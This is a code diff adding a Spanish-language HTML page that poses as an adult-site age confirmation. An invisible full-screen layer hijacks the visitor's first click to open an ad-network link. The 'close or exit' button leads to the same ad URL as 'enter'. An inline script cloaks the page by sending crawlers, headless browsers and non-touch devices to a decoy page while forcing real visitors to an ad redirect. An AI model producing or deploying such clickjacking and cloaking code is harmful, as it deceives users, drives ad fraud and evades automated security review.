@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <title>CONFIRMA ACCESO EXCLUSIVO (+18)</title>
+
+    <style>
+        /* ESTILOS ULTRA-LLAMATIVOS */
+        body, html {
+            margin: 0; padding: 0;
+            width: 100%; height: 100%;
+            overflow: hidden;
+            font-family: 'Montserrat', 'Segoe UI', sans-serif;
+            display: flex; justify-content: center; align-items: center;
+        }
+
+        .bg-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            /* Asegúrate de reemplazar esta URL por una imagen real */
+            background-image: url('URL_DE_TU_IMAGEN_DE_FONDO_PROVOCATIVA.jpg'); 
+            background-size: cover; background-position: center;
+            filter: blur(8px) brightness(40%);
+            z-index: -1;
+        }
+
+        .container { 
+            background: rgba(0, 0, 0, 0.85);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 420px;
+            width: 85%;
+            text-align: center;
+            border: 2px solid #ff004f;
+            box-shadow: 0 0 25px rgba(255, 0, 79, 0.5);
+            backdrop-filter: blur(10px);
+            transition: transform 0.3s ease;
+        }
+
+        h1 { font-size: 28px; color: #ff004f; margin-bottom: 5px; text-transform: uppercase; }
+        .subtitle { color: #fff; font-size: 16px; margin-bottom: 25px; }
+        .confirm-text { color: #ccc; font-size: 14px; margin-bottom: 30px; font-weight: bold; }
+        
+        .btn-entrar { 
+            display: block; background: #ff004f; color: #fff !important; 
+            padding: 20px; text-decoration: none; border-radius: 10px; 
+            font-size: 20px; font-weight: bold; margin-top: 20px;
+            text-transform: uppercase;
+        }
+
+        .btn-salir { 
+            display: block; background: transparent; color: #555 !important; 
+            padding: 12px; text-decoration: none; font-size: 14px; 
+            margin-top: 18px; border: 1px solid #333; border-radius: 8px;
+        }
+
+        #invisible-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div id="invisible-layer"></div>
+    <div class="bg-overlay"></div>
+
+    <div class="container">
+        <h1>ACCESO EXCLUSIVO</h1>
+        <div class="subtitle">Vídeos en 4K UHD, actualizados hoy.🔥</div>
+        <p class="confirm-text">Estás intentando acceder a contenido restringido para menores de 18 años.</p>
+        
+        <a class="btn-entrar" href="https://www.effectivecpmnetwork.com/zve9f0dgzr?key=6b3d82134e5a1578530a7b986d8aa027">SÍ, SOY +18. ENTRAR.</a>
+        <a class="btn-salir" href="https://www.effectivecpmnetwork.com/zve9f0dgzr?key=6b3d82134e5a1578530a7b986d8aa027">Cerrar o Salir</a>
+    </div>
+
+    <script type="text/javascript">
+    (function() {
+        'use strict';
+
+        // CAPA PUBLICITARIA
+        var adLink = "https://www.effectivecpmnetwork.com/zve9f0dgzr?key=6b3d82134e5a1578530a7b986d8aa027";
+        document.getElementById('invisible-layer').addEventListener('click', function() {
+            window.open(adLink, '_blank');
+            this.style.display = 'none';
+        });
+
+        // LÓGICA DE FILTRADO
+        const URL_HUMANO = "https://www.effectivecpmnetwork.com/h2jj743s1?key=6874021867fcef71276a53bc09bd0c07";
+        const URL_BOT = "https://botdetected.blogspot.com/";
+
+        function activarRedireccion(esHumano) {
+            window.removeEventListener('mousemove', detectarHumano);
+            window.removeEventListener('touchstart', detectarHumano);
+            window.removeEventListener('keydown', detectarHumano);
+            window.location.replace(esHumano ? URL_HUMANO : URL_BOT);
+        }
+
+        function detectarHumano() { activarRedireccion(true); }
+
+        const esBot = (navigator.webdriver === true || 
+                       /bot|crawl|headless|spider|phantom|slurp/i.test(navigator.userAgent) ||
+                       !('ontouchstart' in window) || navigator.maxTouchPoints === 0);
+
+        if (esBot) {
+            activarRedireccion(false);
+        } else {
+            window.addEventListener('mousemove', detectarHumano, { once: true });
+            window.addEventListener('touchstart', detectarHumano, { once: true });
+            window.addEventListener('keydown', detectarHumano, { once: true });
+            setTimeout(() => { activarRedireccion(true); }, 3000); 
+        }
+    })();
+    </script>
+</body>
+</html>
